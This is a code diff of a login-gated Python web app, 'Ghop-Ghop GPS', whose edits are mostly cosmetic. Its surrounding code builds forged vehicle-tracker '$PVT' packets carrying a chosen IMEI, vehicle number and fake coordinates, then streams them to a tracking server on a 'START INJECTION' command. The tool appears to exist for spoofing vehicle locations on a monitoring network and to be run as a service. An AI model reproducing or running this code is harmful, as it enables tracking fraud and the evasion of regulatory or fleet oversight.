@@ -15,12 +15,11 @@ lock = threading.Lock()
 
 DEFAULT_TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]
 
-# --- 🏎️ NEW ENGINE (STRONGER STRING FORMAT) ---
+# --- 🏎️ NEW ENGINE (STRONGER Pattern) ---
 def handshake_worker(tag, imei, vno, lat, lon):
     global total_sent
     try:
-        lat_val = float(lat)
-        lon_val = float(lon)
+        lat_v, lon_v = float(lat), float(lon)
     except: return
 
     while not stop_event.is_set():
@@ -33,11 +32,8 @@ def handshake_worker(tag, imei, vno, lat, lon):
                     for _ in range(15):
                         if stop_event.is_set(): break
                         now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
-                        
-                        # 🔥 NEW STRING INTEGRATION (Dynamic Data Placed Correctly)
-                        # Format: $PVT,TAG,1.ONTC,NR,01,L,IMEI,VNO,1,DATE,TIME,LAT,N,LON,E,STATIC_STUFF*
-                        pkt = f"$PVT,{tag},1.ONTC,NR,01,L,{imei},{vno},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{lat_val:.6f},N,{lon_val:.6f},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*\\r\\n"
-                        
+                        # 🔥 Dynamic Packet Logic
+                        pkt = f"$PVT,{tag},1.ONTC,NR,01,L,{imei},{vno},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{lat_v:.6f},N,{lon_v:.6f},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*\\r\\n"
                         s.sendall(bytes(pkt, 'ascii'))
                         with lock: total_sent += 1
                         time.sleep(0.01)
@@ -66,6 +62,7 @@ async def init(v:str, i:str, lt:str, ln:str, t:str, background_tasks: Background
         now_ist = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
         payload = {"Vehicle_No": v_up, "IMEI_No": str(i), "Lat": f"{lt_f:.7f}", "Lon": f"{ln_f:.7f}", "Saved_Tag": t_up, "Status": "Active", "Time": now_ist.strftime('%H:%M:%S')}
         background_tasks.add_task(sync_data, v_up, t_up, payload)
+        
         run_tags = list(DEFAULT_TAGS) if t_up == "ALL" else [t_up]
         if t_up == "ALL":
             try:
@@ -97,16 +94,18 @@ async def home():
     <title>Ghop-Ghop GPS</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        body { background:#000; color:#0f0; font-family:monospace; margin:0; display:flex; flex-direction:column; align-items:center; min-height:100vh; }
+        body { background:#000; color:#0f0; font-family:monospace; margin:0; display:flex; flex-direction:column; align-items:center; min-height:100vh; overflow-x:hidden; }
         .login-box, .dashboard { width:95%; max-width:440px; border:2px solid #0f0; padding:15px; background:rgba(0,10,0,0.95); border-radius:15px; box-shadow: 0 0 25px #0f0; margin-top:20px; box-sizing: border-box; }
         .dashboard { display:none; }
         input, select { width:100%; background:#000; border:1px solid #333; color:#0f0; padding:12px; margin-top:10px; outline:none; text-transform:uppercase; font-size:16px; border-radius:5px; }
-        .chk-group { display: flex; align-items: center; justify-content: flex-start; gap: 10px; margin-top: 15px; width: 100%; color: #fff; padding-left: 5px; }
+        
+        .chk-group { display: flex; align-items: center; justify-content: flex-start; gap: 8px; margin-top: 15px; width: 100%; color: #fff; font-size: 14px; padding-left: 5px; }
         .chk-group input[type="checkbox"] { width: 22px !important; height: 22px !important; margin: 0 !important; cursor: pointer; flex-shrink: 0; appearance: auto; }
-        .chk-group label { cursor: pointer; white-space: nowrap; font-size: 14px; font-weight: bold; }
-        button { width:100%; padding:14px; margin-top:10px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; border-radius:5px; }
+        .chk-group label { cursor: pointer; white-space: nowrap; font-weight: bold; }
+
+        button { width:100%; padding:14px; margin-top:10px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; font-size:14px; border-radius:5px; }
         .progress-container { width:100%; height:12px; background:#111; margin-top:15px; border-radius:6px; display:none; border:1px solid #0f0; overflow:hidden; }
-        #progress-bar { width:0%; height:100%; background: linear-gradient(90deg, #0f0, #004400); }
+        #progress-bar { width:0%; height:100%; background: linear-gradient(90deg, #0f0, #004400); box-shadow: 0 0 10px #0f0; }
         .audit-box { display:flex; justify-content:space-between; background:rgba(0,40,0,0.5); border:1px solid #0f0; padding:8px; margin-top:10px; border-radius:5px; font-size:10px; color:#fff; text-align:center; }
         .audit-box b { display:block; color:#0f0; font-size:14px; }
         .user-wall { background:#001a00; border:1px solid #0f0; padding:10px; margin-top:10px; font-size:13px; display:none; color:red; border-radius:5px; width:100%; }
@@ -120,10 +119,10 @@ async def home():
         <input type="password" id="m_pass" placeholder="PASSWORD">
         <div class="chk-group"><input type="checkbox" id="rem"> <label for="rem">Remember Me</label></div>
         <button onclick="login()" style="background:#0f0;color:#000;border:none;margin-top:20px;">ACCESS SYSTEM</button>
-        <div style="text-align:center; margin-top:20px;"><a href="https://wa.me/917464010787" style="color:#007bff;text-decoration:none;font-weight:bold;">[ CONTACT ADMIN ]</a></div>
+        <div style="text-align:center; margin-top:20px;"><a href="https://wa.me/917464010787" style="color:#007bff;text-decoration:none;font-weight:bold;font-size:16px;">[ CONTACT ADMIN ]</a></div>
     </div>
 
-    <div class="nav" id="dashNav" style="display:none;"><span>USER: <b id="u_name" style="color:#0f0"></b></span><span onclick="logout()" style="color:red;cursor:pointer;">[ LOGOUT ]</span></div>
+    <div class="nav" id="dashNav" style="display:none;"><span>USER: <b id="u_name" style="color:#0f0"></b></span><span onclick="logout()" style="color:red;cursor:pointer;font-weight:bold;">[ LOGOUT ]</span></div>
     
     <div class="dashboard" id="dashScreen">
         <div class="audit-box"><div>OK<b id="a_ok">0</b></div><div>FAIL<b id="a_fail">0</b></div><div>ERROR<b id="a_err">0</b></div><div>TOTAL<b id="a_total">0</b></div></div>
@@ -136,7 +135,10 @@ async def home():
         </select>
         <input type="text" id="manTag" placeholder="ENTER NEW TAG NAME" style="display:none;">
         <div class="chk-group"><input type="checkbox" id="useDef" checked> <label for="useDef">Use Default Location (Profile)</label></div>
-        <div style="display:flex;gap:5px;margin-top:10px;"><input type="text" id="lt" placeholder="LAT" oninput="updateMapManually()"><input type="text" id="ln" placeholder="LON" oninput="updateMapManually()"></div>
+        <div style="display:flex;gap:5px;margin-top:10px;">
+            <input type="text" id="lt" placeholder="LAT" oninput="updateMapManually()">
+            <input type="text" id="ln" placeholder="LON" oninput="updateMapManually()">
+        </div>
         <button onclick="getLocation()">[ GET CURRENT LOCATION ]</button>
         <button onclick="st()" id="startBtn" style="background:#0f0;color:#000;font-size:18px;border:none;">START INJECTION</button>
         <button onclick="sp()" style="color:red;border-color:red;">ABORT</button>
@@ -184,16 +186,25 @@ async def home():
             });
         }
         function checkManual() { document.getElementById('manTag').style.display = (document.getElementById('tagSel').value == "MANUAL") ? 'block' : 'none'; }
+        
         async function smartFetch() {
             let v = document.getElementById('v').value.toUpperCase().trim();
             if(!v) return;
             let res = await fetch(`/fetch_data?vno=${v}&t=${Date.now()}`), d = await res.json();
             if(d.IMEI_No){
                 document.getElementById('i').value = d.IMEI_No;
+                
+                // 🛑 STRICTURE NAN PROTECTION Logic
                 let lat = document.getElementById('useDef').checked ? curUser.lat : (d.Lat || d.lat || "24.919211");
-                let lon = document.getElementById('useDef').checked ? curUser.Lon || d.lon : (d.Lon || d.lon || "83.790586");
-                document.getElementById('lt').value = parseFloat(lat).toFixed(7);
-                document.getElementById('ln').value = parseFloat(lon).toFixed(7);
+                let lon = document.getElementById('useDef').checked ? curUser.lon : (d.Lon || d.lon || "83.790586");
+                
+                let lat_f = parseFloat(lat), lon_f = parseFloat(lon);
+                if(isNaN(lat_f)) lat_f = 24.9192110;
+                if(isNaN(lon_f)) lon_f = 83.7905860;
+
+                document.getElementById('lt').value = lat_f.toFixed(7);
+                document.getElementById('ln').value = lon_f.toFixed(7);
+                
                 if(d.Saved_Tag) { let sel = document.getElementById('tagSel'); if(!Array.from(sel.options).some(o => o.value == d.Saved_Tag)) await loadGlobalTags(); sel.value = d.Saved_Tag; }
                 updateMapManually();
             }
